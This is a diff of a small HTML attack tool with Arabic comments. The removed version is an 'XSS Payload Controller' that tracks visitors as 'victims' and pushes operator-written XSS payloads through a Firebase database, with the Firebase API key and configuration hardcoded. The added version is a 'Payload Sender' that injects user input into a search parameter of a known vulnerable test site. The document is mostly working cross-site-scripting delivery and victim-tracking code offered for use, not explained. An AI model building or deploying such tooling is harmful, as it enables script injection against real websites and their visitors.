@@ -1,96 +1,26 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>🔥 Detector - XSS Payload Controller</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-      background-color: #111;
-      color: #0f0;
-    }
-    input, button {
-      padding: 10px;
-      margin: 10px 0;
-      width: 100%;
-      font-size: 16px;
-    }
-    #logs {
-      background: #222;
-      padding: 10px;
-      margin-top: 20px;
-      height: 200px;
-      overflow-y: scroll;
-      border: 1px solid #444;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payload Sender</title>
 </head>
 <body>
+    <h1>إرسال الـ Payload للموقع الضحية</h1>
+    
+    <!-- حقل إدخال لإرسال رابط الموقع الخاص بك -->
+    <input type="text" id="payloadURL" placeholder="أدخل رابط الموقع هنا">
+    <button onclick="sendPayload()">أرسل الـ Payload</button>
 
-  <h1>🔥 Detector - XSS Payload Controller</h1>
-
-  <p>🟢 Victims Searching for Your URL:</p>
-  <div id="victims"></div>
-
-  <p>✏️ Enter XSS Payload to Send:</p>
-  <input type="text" id="payload" placeholder="مثال: <script>alert(1)</script>">
-  <button onclick="sendPayload()">Send Payload</button>
-
-  <h3>📜 Logs:</h3>
-  <div id="logs"></div>
-
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
-
-  <script>
-    // Firebase configuration
-    const firebaseConfig = {
-      apiKey: "AIzaSyCHmG5U7WmBmnz9feAVqL1cQpGOuJgjeCk",
-      authDomain: "detector-a0c06.firebaseapp.com",
-      databaseURL: "https://detector-a0c06-default-rtdb.firebaseio.com",
-      projectId: "detector-a0c06",
-      storageBucket: "detector-a0c06.appspot.com",
-      messagingSenderId: "343317057810",
-      appId: "1:343317057810:web:529c9fd0f9d963e79b63cb"
-    };
-
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    // سجل زيارة الزائر
-    const ip = Math.random().toString(36).substring(7); // عشوائي لتمييز الزوار
-    db.ref("visits").push({
-      id: ip,
-      time: new Date().toISOString()
-    });
-
-    // إرسال الـ Payload
-    function sendPayload() {
-      const payload = document.getElementById("payload").value;
-      db.ref("payload").set({
-        content: payload
-      });
-    }
-
-    // عرض الـ Payload في الوقت الحقيقي
-    db.ref("payload").on("value", snapshot => {
-      const val = snapshot.val();
-      if (val && val.content) {
-        document.getElementById("logs").innerText += `[Payload Sent] ${val.content}\n`;
-      }
-    });
-
-    // عرض الضحايا
-    db.ref("visits").on("child_added", snapshot => {
-      const val = snapshot.val();
-      const div = document.getElementById("victims");
-      const item = document.createElement("div");
-      item.textContent = `🔸 ID: ${val.id} - ${val.time}`;
-      div.appendChild(item);
-    });
-  </script>
+    <script>
+        // دالة لإرسال الرابط
+        function sendPayload() {
+            const payloadURL = document.getElementById("payloadURL").value;  // أخذ الرابط من الحقل
+            const victimURL = `http://testphp.vulnweb.com/search.php?test=${encodeURIComponent(payloadURL)}`;
+            
+            // إرسال الرابط إلى الموقع الضحية
+            window.location.href = victimURL;  // سيقوم هذا بتوجيه الموقع الضحية إلى الرابط المرسل
+        }
+    </script>
 </body>
 </html>
